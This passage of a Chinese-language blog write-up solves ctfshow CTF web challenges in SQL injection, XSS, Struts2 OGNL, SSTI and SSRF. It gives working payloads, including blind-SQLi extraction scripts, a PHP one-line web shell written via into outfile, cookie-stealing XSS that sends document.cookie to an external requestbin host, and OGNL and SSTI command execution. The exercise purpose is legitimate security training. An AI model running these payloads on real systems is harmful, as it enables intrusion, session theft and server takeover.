+<h3 id="3web173"><a class="markdownIt-Anchor" href="#3web173"></a> 3.web173</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;//这个正则过滤针对的是返回的JSON，而题目给的是ctfshow为开头的flag，所以没有被正则过滤限制（所以这个过滤在这里的意义是？</span><br></pre></td></tr></table></figure>
+<p>多了一个id，没什么区别？）</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select password from ctfshow_user3 where username=&#x27;flag&#x27;) --+</span><br></pre></td></tr></table></figure>
+<p>flag：ctfshow{1143a14a-3ec4-4b16-a0ba-1cb59100bc3b}</p>
+<p>这里特别说明一下，如果返回的是flag而不是ctfshow，我们可以采用哈希，payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,hex((select password from ctfshow_user3 where username=&#x27;flag&#x27;)) %23</span><br></pre></td></tr></table></figure>
+<p>这样就能绕过正则过滤</p>
+<h3 id="4web174"><a class="markdownIt-Anchor" href="#4web174"></a> 4.web174</h3>
+<p>过滤了0-9数字，可以转ASCII码用脚本猜出来</p>
+<p>布尔盲注QAQ</p>
+<p>先构造本题payload，然后跑一个布尔盲注脚本出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;-1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://b81f9cd4-bad2-4ece-9787-7c26b9c04148.challenge.ctf.show:80/api/v4.php?id=&quot;</span></span><br><span class="line">//记住别用https协议，会加密产生空处，该url可以用AI写个脚本来跑出可访问API，然后再写盲注脚本</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    response = requests.get(url + payload.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>也可以手动写一个替换的语句，分别把0-9的数字替换成大写字母：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;A&#x27;),&#x27;2&#x27;,&#x27;B&#x27;),&#x27;3&#x27;,&#x27;C&#x27;),&#x27;4&#x27;,&#x27;D&#x27;),&#x27;5&#x27;,&#x27;E&#x27;),&#x27;6&#x27;,&#x27;F&#x27;),&#x27;7&#x27;,&#x27;G&#x27;),&#x27;8&#x27;,&#x27;H&#x27;),&#x27;9&#x27;,&#x27;I&#x27;),&#x27;0&#x27;,&#x27;J&#x27;),&#x27;a&#x27; from ctfshow_user4--+</span><br></pre></td></tr></table></figure>
+<p>直接丢给AI替换后得到flag：ctfshow{96a9026-70fe-4ca6-8b10-8e7d7acacb99}</p>
+<h3 id="5web175"><a class="markdownIt-Anchor" href="#5web175"></a> 5.web175</h3>
+<p>666全给我过滤了牛逼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/[\x00-\x7f]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了所以ASCII字符</p>
+<p>差不多等于没有回显，这样的话上一题的替换就没办法起作用了</p>
+<p>那就只能用时间盲注了；写个脚本emmmmmm，具体和上一题布尔盲注差不多</p>
+<p>当条件为真sleep2秒再返回，为假立即返回：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;-1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1) %23&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://caad62de-9c37-4200-8525-9bd874228036.challenge.ctf.show:80/api/v5.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url + payload.<span class="built_in">format</span>(index, offset), timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>跑完得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;4eb0a696-0ae3-4557-92f7-b8828fd63bcd&#125;</span><br></pre></td></tr></table></figure>
+<p>看了大佬的博客才知道SQL还可以采用文件写入和一句话木马的方式！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+<p>然后直接访问文件即可。（还是太强了QAQ</p>
+<p>一句话木马这道题没有用，但是真好，写入，然后访问，然后还能用蚁剑或phpinfo查看环境变量(flag_no_here)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select &#x27;&lt;?php eval($_POST[\&#x27;a\&#x27;]);?&gt;&#x27;,1  into outfile &#x27;/var/www/html/xqx.php&#x27;--+</span><br></pre></td></tr></table></figure>
+<h3 id="6web176"><a class="markdownIt-Anchor" href="#6web176"></a> 6.web176</h3>
+<p>过滤注入</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>万能注入</p>
+<p>flag：ctfshow{d06d0ed6-19c5-4411-b0a9-35ce8829e2df}</p>
+<p>后面发现这一题是过滤了select字段，使用大小写绕过sElect即可。</p>
+<h3 id="7web177"><a class="markdownIt-Anchor" href="#7web177"></a> 7.web177</h3>
+<p>这题不知道为什么用不了子查询语句？）</p>
+<p>过滤空格</p>
+<p>依旧万能注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or/**/1=1%23</span><br></pre></td></tr></table></figure>
+<p>当然也可以直接查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>逗逗你的，还是可以子查询的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#x27;flag&#x27;)%09%23</span><br></pre></td></tr></table></figure>
+<p>不过有点奇怪，/**/好像真不行？</p>
+<h3 id="8web178"><a class="markdownIt-Anchor" href="#8web178"></a> 8.web178</h3>
+<p>过滤了<code>*</code>，那么就需要用其它字符来绕过空格，可以选择</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%09 tab%0a%0b%0c%0d </span><br><span class="line">1&#x27;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>
+<p>也可以依旧万能注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or%0a1=1%231’or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>ctfshow{8d5c9b0f-6fd3-41a6-ab07-854e6a22a060}</p>
+<h3 id="9web179"><a class="markdownIt-Anchor" href="#9web179"></a> 9.web179</h3>
+<p>依旧万能，过滤了<code>%09 %0a %0b %0d</code></p>
+<p>可以用<code>%0c</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or%0c1=1%231’or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>ctfshow{8645bd0f-3bc0-4d85-aedb-6ac2a440269e}</p>
+<h3 id="10web180"><a class="markdownIt-Anchor" href="#10web180"></a> 10.web180</h3>
+<p>比上一题多了个#过滤；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#x27;flag&#x27;)%0c--%0c</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{c9bed3be-814c-42a1-9e1c-27545ff09f6d}</p>
+<h3 id="11web181"><a class="markdownIt-Anchor" href="#11web181"></a> 11.web181</h3>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;or(id=26)and&#x27;1</span><br></pre></td></tr></table></figure>
+<h2 id="四-xss"><a class="markdownIt-Anchor" href="#四-xss"></a> 四、xss</h2>
+<h3 id="1web316"><a class="markdownIt-Anchor" href="#1web316"></a> 1.web316</h3>
+<p>反射型xss，没有给出过滤，可惜的是webhook收费了，所以我用了request.bin（其实还挺好用的，主要是免费而且不用自己创建项目）</p>
+<p>得到flag：ctfshow{947eff4f-1d2b-41e8-abeb-d6d7be321061}</p>
+<h3 id="2web317"><a class="markdownIt-Anchor" href="#2web317"></a> 2.web317</h3>
+<p>过滤了script标签，所以我们采用img标签执行跳转，</p>
+<p>我试了好几个payload都不行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;new Image().src=&#x27;http://www.requestbin.cn:80/16bzy181?cookie=&#x27;+encodeURIComponent(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;location.href=&#x27;http://www.requestbin.cn:80/16bzy181?cookie=&#x27;+encodeURIComponent(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;new Image().src=&#x27;http://www.requestbin.cn:80/16bzy181?cookie=&#x27;+encodeURIComponent(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这些payload不是说不能执行xss，而是会返回非admin的提示</p>
+<p>有效payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&quot;location.href=&#x27;http://www.requestbin.cn:80/16bzy181?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&quot;new Image().src=&#x27;http://www.requestbin.cn:80/16bzy181?cookie=&#x27;+encodeURIComponent(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这是什么原因？</p>
+<p>查了一下，</p>
+<ol>
+<li><strong>Payload 1 (<code>src=&quot;x&quot;</code>)</strong>：
+<ul>
+<li>浏览器尝试加载一个名为 <code>x</code> 的资源（图片）。</li>
+<li>这个资源<strong>不存在</strong>，所以触发 <code>onerror</code> 事件，执行你的 JavaScript。</li>
+<li><strong>但是</strong>，加载失败后，浏览器<strong>不会</strong>对当前页面做任何其他操作。</li>
+<li>你的 <code>new Image()</code> 请求发送时，页面状态（包括 Cookie）<strong>没有被刷新</strong>。此时 Bot 的 Cookie 很可能还是最初的那个“非 admin”状态。</li>
+</ul>
+</li>
+<li><strong>Payload 2 (<code>src=&quot;&quot;</code>)</strong>：
+<ul>
+<li>在部分浏览器中，<code>&lt;img src=&quot;&quot;&gt;</code> 会被解析为 <strong>“当前页面的 URL”</strong>。</li>
+<li>这意味着，浏览器会<strong>重新加载当前页面</strong>。</li>
+<li><strong>重新加载的瞬间</strong>，服务器再次处理请求，并可能在响应头中 <strong><code>Set-Cookie</code>，将真正的 Flag 写入 Cookie</strong>。</li>
+<li>随后，你的 <code>new Image()</code> 请求发出时，<code>document.cookie</code> 已经被更新为包含 flag 的状态，所以成功了。</li>
+</ul>
+</li>
+</ol>
+<p>得到flag：ctfshow{28374138-066d-4835-be12-7b3c71e3e00b}</p>
+<h3 id="3web318319"><a class="markdownIt-Anchor" href="#3web318319"></a> 3.web318&amp;319</h3>
+<p>img被过滤了，直接用body标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=location.href=&quot;http://www.requestbin.cn:80/123zopb1?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{f03b9535-503d-4bbd-a69d-c82434061e3a}</p>
+<h3 id="4web320-326"><a class="markdownIt-Anchor" href="#4web320-326"></a> 4.web320-326</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=location.href=&quot;http://www.requestbin.cn:80/18aobyv1?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+<p>空格过滤</p>
+<p>得到：ctfshow{3d87620f-6792-4039-a04a-ad5876a70204}</p>
+<h3 id="5web327"><a class="markdownIt-Anchor" href="#5web327"></a> 5.web327</h3>
+<p>和前几题一样的payloademmmmmm</p>
+<p>ctfshow{c46abf22-94b7-46d6-a3fb-550ab66bd85a}</p>
+<h2 id="五-java"><a class="markdownIt-Anchor" href="#五-java"></a> 五、java</h2>
+<h3 id="1web279"><a class="markdownIt-Anchor" href="#1web279"></a> 1.web279</h3>
+<p>S2-001漏洞</p>
+<p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">了解下OGNL表达式中三个符号 %，#，$ 的含义</span><br><span class="line"></span><br><span class="line">%的用途是在标志的属性为字符串类型时，计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line">#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</span><br><span class="line">$主要是在Struts 2配置文件中，引用OGNL表达式</span><br></pre></td></tr></table></figure>
+<p>AI启动搞了个payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;   #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),   #b=#a.getInputStream(),   #c=new java.io.InputStreamReader(#b),   #d=new java.io.BufferedReader(#c),   #e=new char[50000],   #d.read(#e),   #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),   #f.getWriter().println(new java.lang.String(#e)),   #f.getWriter().flush(),   #f.getWriter().close() &#125;</span><br></pre></td></tr></table></figure>
+<p>得到环境变量中的flag：</p>
+<p>ctfshow{47d58569-342c-410d-8a25-185ee3d6db99}</p>
+<p>当然这题可以直接用工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://d6dc977e-f251-4e90-b943-cc51fc1323ff.challenge.ctf.show:8080/S2-001/login.action -n S2-001 --exec</span><br><span class="line">&gt;&gt;&gt; env</span><br></pre></td></tr></table></figure>
+<h3 id="2web280"><a class="markdownIt-Anchor" href="#2web280"></a> 2.web280</h3>
+<p>S2-005漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CabbageJun/p/15950224.html">S2-005复现分析 - CabbageJun - 博客园</a></p>
+<p>用工具做吧这一题QAQ，其他窝不会emmmmmm</p>
+<h3 id="3web281"><a class="markdownIt-Anchor" href="#3web281"></a> 3.web281</h3>
+<p>S2-007漏洞</p>
+<p>S2-007漏洞一般出现在表单处。当配置了验证规则 -validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<h2 id="六-ssti"><a class="markdownIt-Anchor" href="#六-ssti"></a> 六、SSTI</h2>
+<h3 id="1web361"><a class="markdownIt-Anchor" href="#1web361"></a> 1.web361</h3>
+<p>1.找基类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__&#125;&#125; </span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>2.找子类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取函数所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身.</span><br></pre></td></tr></table></figure>
+<p>其实在面向对象的角度解释这样做很容易，对象是需要初始化的，而 <strong>init</strong> 的作用就是把我们选取的对象初始化，然后如何去使用对象中的方法呢？这就需要用到 <strong>globals</strong> 来获取对全局变量或模块的引用。<br />
+所以初始化对象，获取函数方法合集，并确定存在内建 eval 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>ctfshow{5f922853-ee79-4fe2-a19d-f0702dc46a50}</p>
+<h3 id="2web362"><a class="markdownIt-Anchor" href="#2web362"></a> 2.web362</h3>
+<h2 id="七-ssrf"><a class="markdownIt-Anchor" href="#七-ssrf"></a> 七、SSRF</h2>
+<h3 id="1web351"><a class="markdownIt-Anchor" href="#1web351"></a> 1.web351</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>curl_exec 函数，常见的SSRF漏洞，传入url作为参数</p>
+<p>尝试使用 file 协议读文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<p>得到flag的同时发现还有这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;非本地用户禁止访问&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+<p>ctfshow{2f0c41ed-617b-4eff-97e9-fe937f8f3415}</p>
+<h3 id="2web352"><a class="markdownIt-Anchor" href="#2web352"></a> 2.web352</h3>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/">https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-21 10:01:34</p>
